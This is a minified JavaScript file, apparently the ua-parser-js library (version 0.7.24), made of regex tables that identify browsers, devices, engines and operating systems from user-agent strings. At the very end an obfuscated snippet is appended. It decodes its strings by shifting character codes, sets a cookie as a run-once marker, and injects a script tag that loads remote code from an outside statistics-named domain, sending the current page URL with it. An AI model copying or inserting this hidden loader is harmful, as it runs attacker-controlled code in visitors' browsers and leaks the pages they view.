Mini"],m],[/\s(opr)\/([\w\.]+)/i],[[u,"Opera"],m],[/(kindle)\/([\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?([\w\.]*)/i,/(avant\s|iemobile|slim)(?:browser)?[\/\s]?([\w\.]*)/i,/(bidubrowser|baidubrowser)[\/\s]?([\w\.]+)/i,/(?:ms|\()(ie)\s([\w\.]+)/i,/(rekonq)\/([\w\.]*)/i,/(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs|bowser|quark|qupzilla|falkon)\/([\w\.-]+)/i],[u,m],[/(konqueror)\/([\w\.]+)/i],[[u,"Konqueror"],m],[/(trident).+rv[:\s]([\w\.]{1,9}).+like\sgecko/i],[[u,"IE"],m],[/(edge|edgios|edga|edg)\/((\d+)?[\w\.]+)/i],[[u,"Edge"],m],[/(yabrowser)\/([\w\.]+)/i],[[u,"Yandex"],m],[/(Avast)\/([\w\.]+)/i],[[u,"Avast Secure Browser"],m],[/(AVG)\/([\w\.]+)/i],[[u,"AVG Secure Browser"],m],[/(puffin)\/([\w\.]+)/i],[[u,"Puffin"],m],[/(focus)\/([\w\.]+)/i],[[u,"Firefox Focus"],m],[/(opt)\/([\w\.]+)/i],[[u,"Opera Touch"],m],[/((?:[\s\/])uc?\s?browser|(?:juc.+)ucweb)[\/\s]?([\w\.]+)/i],[[u,"UCBrowser"],m],[/(comodo_dragon)\/([\w\.]+)/i],[[u,/_/g," "],m],[/(windowswechat qbcore)\/([\w\.]+)/i],[[u,"WeChat(Win) Desktop"],m],[/(micromessenger)\/([\w\.]+)/i],[[u,"WeChat"],m],[/(brave)\/([\w\.]+)/i],[[u,"Brave"],m],[/(whale)\/([\w\.]+)/i],[[u,"Whale"],m],[/(qqbrowserlite)\/([\w\.]+)/i],[u,m],[/(QQ)\/([\d\.]+)/i],[u,m],[/m?(qqbrowser)[\/\s]?([\w\.]+)/i],[u,m],[/(baiduboxapp)[\/\s]?([\w\.]+)/i],[u,m],[/(2345Explorer)[\/\s]?([\w\.]+)/i],[u,m],[/(MetaSr)[\/\s]?([\w\.]+)/i],[u],[/(LBBROWSER)/i],[u],[/xiaomi\/miuibrowser\/([\w\.]+)/i],[m,[u,"MIUI Browser"]],[/;fbav\/([\w\.]+);/i],[m,[u,"Facebook"]],[/FBAN\/FBIOS|FB_IAB\/FB4A/i],[[u,"Facebook"]],[/safari\s(line)\/([\w\.]+)/i,/android.+(line)\/([\w\.]+)\/iab/i],[u,m],[/headlesschrome(?:\/([\w\.]+)|\s)/i],[m,[u,"Chrome Headless"]],[/\swv\).+(chrome)\/([\w\.]+)/i],[[u,/(.+)/,"$1 WebView"],m],[/((?:oculus|samsung)browser)\/([\w\.]+)/i],[[u,/(.+(?:g|us))(.+)/,"$1 $2"],m],[/android.+version\/([\w\.]+)\s+(?:mobile\s?safari|safari)*/i],[m,[u,"Android Browser"]],[/(coc_coc_browser)\/([\w\.]+)/i],[[u,"Coc Coc"],m],[/(sailfishbrowser)\/([\w\.]+)/i],[[u,"Sailfish Browser"],m],[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?([\w\.]+)/i],[u,m],[/(dolfin)\/([\w\.]+)/i],[[u,"Dolphin"],m],[/(qihu|qhbrowser|qihoobrowser|360browser)/i],[[u,"360 Browser"]],[/((?:android.+)crmo|crios)\/([\w\.]+)/i],[[u,"Chrome"],m],[/(coast)\/([\w\.]+)/i],[[u,"Opera Coast"],m],[/fxios\/([\w\.-]+)/i],[m,[u,"Firefox"]],[/version\/([\w\.]+)\s.*mobile\/\w+\s(safari)/i],[m,[u,"Mobile Safari"]],[/version\/([\w\.]+)\s.*(mobile\s?safari|safari)/i],[m,u],[/webkit.+?(gsa)\/([\w\.]+)\s.*(mobile\s?safari|safari)(\/[\w\.]+)/i],[[u,"GSA"],m],[/webkit.+?(mobile\s?safari|safari)(\/[\w\.]+)/i],[u,[m,S.str,T.browser.oldsafari.version]],[/(webkit|khtml)\/([\w\.]+)/i],[u,m],[/(navigator|netscape)\/([\w\.-]+)/i],[[u,"Netscape"],m],[/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?([\w\.\+]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix|palemoon|basilisk|waterfox)\/([\w\.-]+)$/i,/(firefox)\/([\w\.]+)\s[\w\s\-]+\/[\w\.]+$/i,/(mozilla)\/([\w\.]+)\s.+rv\:.+gecko\/\d+/i,/(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir)[\/\s]?([\w\.]+)/i,/(links)\s\(([\w\.]+)/i,/(gobrowser)\/?([\w\.]*)/i,/(ice\s?browser)\/v?([\w\._]+)/i,/(mosaic)[\/\s]([\w\.]+)/i],[u,m]],cpu:[[/(?:(amd|x(?:(?:86|64)[_-])?|wow|win)64)[;\)]/i],[[p,"amd64"]],[/(ia32(?=;))/i],[[p,y.lowerize]],[/((?:i[346]|x)86)[;\)]/i],[[p,"ia32"]],[/windows\s(ce|mobile);\sppc;/i],[[p,"arm"]],[/((?:ppc|powerpc)(?:64)?)(?:\smac|;|\))/i],[[p,/ower/,"",y.lowerize]],[/(sun4\w)[;\)]/i],[[p,"sparc"]],[/((?:avr32|ia64(?=;))|68k(?=\))|arm(?:64|(?=v\d+[;l]))|(?=atmel\s)avr|(?:irix|mips|sparc)(?:64)?(?=;)|pa-risc)/i],[[p,y.lowerize]]],device:[[/\((ipad|playbook);[\w\s\),;-]+(rim|apple)/i],[l,b,[c,g]],[/applecoremedia\/[\w\.]+ \((ipad)/],[l,[b,"Apple"],[c,g]],[/(apple\s{0,1}tv)/i],[[l,"Apple TV"],[b,"Apple"],[c,v]],[/(archos)\s(gamepad2?)/i,/(hp).+(touchpad)/i,/(hp).+(tablet)/i,/(kindle)\/([\w\.]+)/i,/\s(nook)[\w\s]+build\/(\w+)/i,/(dell)\s(strea[kpr\s\d]*[\dko])/i],[b,l,[c,g]],[/(kf[A-z]+)(\sbuild\/|\)).+silk\//i],[l,[b,"Amazon"],[c,g]],[/(sd|kf)[0349hijorstuw]+(\sbuild\/|\)).+silk\//i],[[l,S.str,T.device.amazon.model],[b,"Amazon"],[c,h]],[/android.+aft([\w])(\sbuild\/|\))/i],[l,[b,"Amazon"],[c,v]],[/\((ip[honed|\s\w*]+);.+(apple)/i],[l,b,[c,h]],[/\((ip[honed|\s\w*]+);/i],[l,[b,"Apple"],[c,h]],[/(blackberry)[\s-]?(\w+)/i,/(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|meizu|motorola|polytron)[\s_-]?([\w-]*)/i,/(hp)\s([\w\s]+\w)/i,/(asus)-?(\w+)/i],[b,l,[c,h]],[/\(bb10;\s(\w+)/i],[l,[b,"BlackBerry"],[c,h]],[/android.+(transfo[prime\s]{4,10}\s\w+|eeepc|slider\s\w+|nexus 7|padfone|p00c)/i],[l,[b,"Asus"],[c,g]],[/(sony)\s(tablet\s[ps])\sbuild\//i,/(sony)?(?:sgp.+)\sbuild\//i],[[b,"Sony"],[l,"Xperia Tablet"],[c,g]],[/android.+\s([c-g]\d{4}|so[-l]\w+)(?=\sbuild\/|\).+chrome\/(?![1-6]{0,1}\d\.))/i],[l,[b,"Sony"],[c,h]],[/\s(ouya)\s/i,/(nintendo)\s([wids3u]+)/i],[b,l,[c,f]],[/android.+;\s(shield)\sbuild/i],[l,[b,"Nvidia"],[c,f]],[/(playstation\s[34portablevi]+)/i],[l,[b,"Sony"],[c,f]],[/(sprint\s(\w+))/i],[[b,S.str,T.device.sprint.vendor],[l,S.str,T.device.sprint.model],[c,h]],[/(htc)[;_\s-]{1,2}([\w\s]+(?=\)|\sbuild)|\w+)/i,/(zte)-(\w*)/i,/(alcatel|geeksphone|nexian|panasonic|(?=;\s)sony)[_\s-]?([\w-]*)/i],[b,[l,/_/g," "],[c,h]],[/(nexus\s9)/i],[l,[b,"HTC"],[c,g]],[/d\/huawei([\w\s-]+)[;\)]/i,/android.+\s(nexus\s6p|vog-[at]?l\d\d|ane-[at]?l[x\d]\d|eml-a?l\d\da?|lya-[at]?l\d[\dc]|clt-a?l\d\di?)/i],[l,[b,"Huawei"],[c,h]],[/android.+(bah2?-a?[lw]\d{2})/i],[l,[b,"Huawei"],[c,g]],[/(microsoft);\s(lumia[\s\w]+)/i],[b,l,[c,h]],[/[\s\(;](xbox(?:\sone)?)[\s\);]/i],[l,[b,"Microsoft"],[c,f]],[/(kin\.[onetw]{3})/i],[[l,/\./g," "],[b,"Microsoft"],[c,h]],[/\s(milestone|droid(?:[2-4x]|\s(?:bionic|x2|pro|razr))?:?(\s4g)?)[\w\s]+build\//i,/mot[\s-]?(\w*)/i,/(XT\d{3,4}) build\//i,/(nexus\s6)/i],[l,[b,"Motorola"],[c,h]],[/android.+\s(mz60\d|xoom[\s2]{0,2})\sbuild\//i],[l,[b,"Motorola"],[c,g]],[/hbbtv\/\d+\.\d+\.\d+\s+\([\w\s]*;\s*(\w[^;]*);([^;]*)/i],[[b,y.trim],[l,y.trim],[c,v]],[/hbbtv.+maple;(\d+)/i],[[l,/^/,"SmartTV"],[b,"Samsung"],[c,v]],[/\(dtv[\);].+(aquos)/i],[l,[b,"Sharp"],[c,v]],[/android.+((sch-i[89]0\d|shw-m380s|SM-P605|SM-P610|SM-P587|gt-p\d{4}|gt-n\d+|sgh-t8[56]9|nexus 10))/i,/((SM-T\w+))/i],[[b,"Samsung"],l,[c,g]],[/smart-tv.+(samsung)/i],[b,[c,v],l],[/((s[cgp]h-\w+|gt-\w+|galaxy\snexus|sm-\w[\w\d]+))/i,/(sam[sung]*)[\s-]*(\w+-?[\w-]*)/i,/sec-((sgh\w+))/i],[[b,"Samsung"],l,[c,h]],[/sie-(\w*)/i],[l,[b,"Siemens"],[c,h]],[/(maemo|nokia).*(n900|lumia\s\d+)/i,/(nokia)[\s_-]?([\w-]*)/i],[[b,"Nokia"],l,[c,h]],[/android[x\d\.\s;]+\s([ab][1-7]\-?[0178a]\d\d?)/i],[l,[b,"Acer"],[c,g]],[/android.+([vl]k\-?\d{3})\s+build/i],[l,[b,"LG"],[c,g]],[/android\s3\.[\s\w;-]{10}(lg?)-([06cv9]{3,4})/i],[[b,"LG"],l,[c,g]],[/linux;\snetcast.+smarttv/i,/lg\snetcast\.tv-201\d/i],[[b,"LG"],l,[c,v]],[/(nexus\s[45])/i,/lg[e;\s\/-]+(\w*)/i,/android.+lg(\-?[\d\w]+)\s+build/i],[l,[b,"LG"],[c,h]],[/(lenovo)\s?(s(?:5000|6000)(?:[\w-]+)|tab(?:[\s\w]+))/i],[b,l,[c,g]],[/android.+(ideatab[a-z0-9\-\s]+)/i],[l,[b,"Lenovo"],[c,g]],[/(lenovo)[_\s-]?([\w-]+)/i],[b,l,[c,h]],[/linux;.+((jolla));/i],[b,l,[c,h]],[/((pebble))app\/[\d\.]+\s/i],[b,l,[c,x]],[/android.+;\s(oppo)\s?([\w\s]+)\sbuild/i],[b,l,[c,h]],[/crkey/i],[[l,"Chromecast"],[b,"Google"],[c,v]],[/android.+;\s(glass)\s\d/i],[l,[b,"Google"],[c,x]],[/android.+;\s(pixel c)[\s)]/i],[l,[b,"Google"],[c,g]],[/android.+;\s(pixel( [2-9]a?)?( xl)?)[\s)]/i],[l,[b,"Google"],[c,h]],[/android.+;\s(\w+)\s+build\/hm\1/i,/android.+(hm[\s\-_]?note?[\s_]?(?:\d\w)?)\sbuild/i,/android.+(redmi[\s\-_]?(?:note|k)?(?:[\s_]?[\w\s]+))(?:\sbuild|\))/i,/android.+(mi[\s\-_]?(?:a\d|one|one[\s_]plus|note lte)?[\s_]?(?:\d?\w?)[\s_]?(?:plus)?)\sbuild/i],[[l,/_/g," "],[b,"Xiaomi"],[c,h]],[/android.+(mi[\s\-_]?(?:pad)(?:[\s_]?[\w\s]+))(?:\sbuild|\))/i],[[l,/_/g," "],[b,"Xiaomi"],[c,g]],[/android.+;\s(m[1-5]\snote)\sbuild/i],[l,[b,"Meizu"],[c,h]],[/(mz)-([\w-]{2,})/i],[[b,"Meizu"],l,[c,h]],[/android.+a000(1)\s+build/i,/android.+oneplus\s(a\d{4})[\s)]/i],[l,[b,"OnePlus"],[c,h]],[/android.+[;\/]\s*(RCT[\d\w]+)\s+build/i],[l,[b,"RCA"],[c,g]],[/android.+[;\/\s](Venue[\d\s]{2,7})\s+build/i],[l,[b,"Dell"],[c,g]],[/android.+[;\/]\s*(Q[T|M][\d\w]+)\s+build/i],[l,[b,"Verizon"],[c,g]],[/android.+[;\/]\s+(Barnes[&\s]+Noble\s+|BN[RT])(\S(?:.*\S)?)\s+build/i],[[b,"Barnes & Noble"],l,[c,g]],[/android.+[;\/]\s+(TM\d{3}.*\b)\s+build/i],[l,[b,"NuVision"],[c,g]],[/android.+;\s(k88)\sbuild/i],[l,[b,"ZTE"],[c,g]],[/android.+[;\/]\s*(gen\d{3})\s+build.*49h/i],[l,[b,"Swiss"],[c,h]],[/android.+[;\/]\s*(zur\d{3})\s+build/i],[l,[b,"Swiss"],[c,g]],[/android.+[;\/]\s*((Zeki)?TB.*\b)\s+build/i],[l,[b,"Zeki"],[c,g]],[/(android).+[;\/]\s+([YR]\d{2})\s+build/i,/android.+[;\/]\s+(Dragon[\-\s]+Touch\s+|DT)(\w{5})\sbuild/i],[[b,"Dragon Touch"],l,[c,g]],[/android.+[;\/]\s*(NS-?\w{0,9})\sbuild/i],[l,[b,"Insignia"],[c,g]],[/android.+[;\/]\s*((NX|Next)-?\w{0,9})\s+build/i],[l,[b,"NextBook"],[c,g]],[/android.+[;\/]\s*(Xtreme\_)?(V(1[045]|2[015]|30|40|60|7[05]|90))\s+build/i],[[b,"Voice"],l,[c,h]],[/android.+[;\/]\s*(LVTEL\-)?(V1[12])\s+build/i],[[b,"LvTel"],l,[c,h]],[/android.+;\s(PH-1)\s/i],[l,[b,"Essential"],[c,h]],[/android.+[;\/]\s*(V(100MD|700NA|7011|917G).*\b)\s+build/i],[l,[b,"Envizen"],[c,g]],[/android.+[;\/]\s*(Le[\s\-]+Pan)[\s\-]+(\w{1,9})\s+build/i],[b,l,[c,g]],[/android.+[;\/]\s*(Trio[\s\w\-\.]+)\s+build/i],[l,[b,"MachSpeed"],[c,g]],[/android.+[;\/]\s*(Trinity)[\-\s]*(T\d{3})\s+build/i],[b,l,[c,g]],[/android.+[;\/]\s*TU_(1491)\s+build/i],[l,[b,"Rotor"],[c,g]],[/android.+(Gigaset)[\s\-]+(Q\w{1,9})\s+build/i],[b,l,[c,g]],[/android .+?; ([^;]+?)(?: build|\) applewebkit).+? mobile safari/i],[l,[c,h]],[/android .+?;\s([^;]+?)(?: build|\) applewebkit).+?(?! mobile) safari/i],[l,[c,g]],[/\s(tablet|tab)[;\/]/i,/\s(mobile)(?:[;\/]|\ssafari)/i],[[c,y.lowerize],b,l],[/[\s\/\(](smart-?tv)[;\)]/i],[[c,v]],[/(android[\w\.\s\-]{0,9});.+build/i],[l,[b,"Generic"]],[/(phone)/i],[[c,h]]],engine:[[/windows.+\sedge\/([\w\.]+)/i],[m,[u,"EdgeHTML"]],[/webkit\/537\.36.+chrome\/(?!27)([\w\.]+)/i],[m,[u,"Blink"]],[/(presto)\/([\w\.]+)/i,/(webkit|trident|netfront|netsurf|amaya|lynx|w3m|goanna)\/([\w\.]+)/i,/(khtml|tasman|links)[\/\s]\(?([\w\.]+)/i,/(icab)[\/\s]([23]\.[\d\.]+)/i],[u,m],[/rv\:([\w\.]{1,9}).+(gecko)/i],[m,u]],os:[[/(xbox);\s+xbox\s([^\);]+)/i,/microsoft\s(windows)\s(vista|xp)/i],[u,m],[/(windows)\snt\s6\.2;\s(arm)/i,/(windows\sphone(?:\sos)*)[\s\/]?([\d\.\s\w]*)/i,/(windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i],[u,[m,S.str,T.os.windows.version]],[/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i],[[u,"Windows"],[m,S.str,T.os.windows.version]],[/\((bb)(10);/i],[[u,"BlackBerry"],m],[/(blackberry)\w*\/?([\w\.]*)/i,/(tizen|kaios)[\/\s]([\w\.]+)/i,/(android|webos|palm\sos|qnx|bada|rim\stablet\sos|meego|sailfish|contiki)[\/\s-]?([\w\.]*)/i],[u,m],[/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]*)/i],[[u,"Symbian"],m],[/\((series40);/i],[u],[/mozilla.+\(mobile;.+gecko.+firefox/i],[[u,"Firefox OS"],m],[/crkey\/([\d\.]+)/i],[m,[u,"Chromecast"]],[/(nintendo|playstation)\s([wids34portablevu]+)/i,/(mint)[\/\s\(]?(\w*)/i,/(mageia|vectorlinux)[;\s]/i,/(joli|[kxln]?ubuntu|debian|suse|opensuse|gentoo|(?=\s)arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)[\/\s-]?(?!chrom)([\w\.-]*)/i,/(hurd|linux)\s?([\w\.]*)/i,/(gnu)\s?([\w\.]*)/i],[u,m],[/(cros)\s[\w]+\s([\w\.]+\w)/i],[[u,"Chromium OS"],m],[/(sunos)\s?([\w\.\d]*)/i],[[u,"Solaris"],m],[/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]*)/i],[u,m],[/(haiku)\s(\w+)/i],[u,m],[/cfnetwork\/.+darwin/i,/ip[honead]{2,4}(?:.*os\s([\w]+)\slike\smac|;\sopera)/i],[[m,/_/g,"."],[u,"iOS"]],[/(mac\sos\sx)\s?([\w\s\.]*)/i,/(macintosh|mac(?=_powerpc)\s)/i],[[u,"Mac OS"],[m,/_/g,"."]],[/((?:open)?solaris)[\/\s-]?([\w\.]*)/i,/(aix)\s((\d)(?=\.|\)|\s)[\w\.])*/i,/(plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos|openvms|fuchsia)/i,/(unix)\s?([\w\.]*)/i],[u,m]]},E=function(e,r){if("object"==typeof e&&(r=e,e=s),!(this instanceof E))return new E(e,r).getResult();var a=e||(i&&i.navigator&&i.navigator.userAgent?i.navigator.userAgent:""),n=r?y.extend(A,r):A;return this.getBrowser=function(){var i={name:s,version:s};return S.rgx.call(i,a,n.browser),i.major=y.major(i.version),i},this.getCPU=function(){var i={architecture:s};return S.rgx.call(i,a,n.cpu),i},this.getDevice=function(){var i={vendor:s,model:s,type:s};return S.rgx.call(i,a,n.device),i},this.getEngine=function(){var i={name:s,version:s};return S.rgx.call(i,a,n.engine),i},this.getOS=function(){var i={name:s,version:s};return S.rgx.call(i,a,n.os),i},this.getResult=function(){return{ua:this.getUA(),browser:this.getBrowser(),engine:this.getEngine(),os:this.getOS(),device:this.getDevice(),cpu:this.getCPU()}},this.getUA=function(){return a},this.setUA=function(i){return a=i,this},this};E.VERSION="0.7.24",E.BROWSER={NAME:u,MAJOR:"major",VERSION:m},E.CPU={ARCHITECTURE:p},E.DEVICE={MODEL:l,VENDOR:b,TYPE:c,CONSOLE:f,MOBILE:h,SMARTTV:v,TABLET:g,WEARABLE:x,EMBEDDED:"embedded"},E.ENGINE={NAME:u,VERSION:m},E.OS={NAME:u,VERSION:m},typeof exports!==n?(typeof module!==n&&module.exports&&(exports=module.exports=E),exports.UAParser=E):"function"==typeof define&&define.amd?define((function(){return E})):i&&(i.UAParser=E);var N=i&&(i.jQuery||i.Zepto);if(N&&!N.ua){var B=new E;N.ua=B.getResult(),N.ua.get=function(){return B.getUA()},N.ua.set=function(i){B.setUA(i);var s=B.getResult();for(var e in s)N.ua[e]=s[e]}}}("object"==typeof window?window:this);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));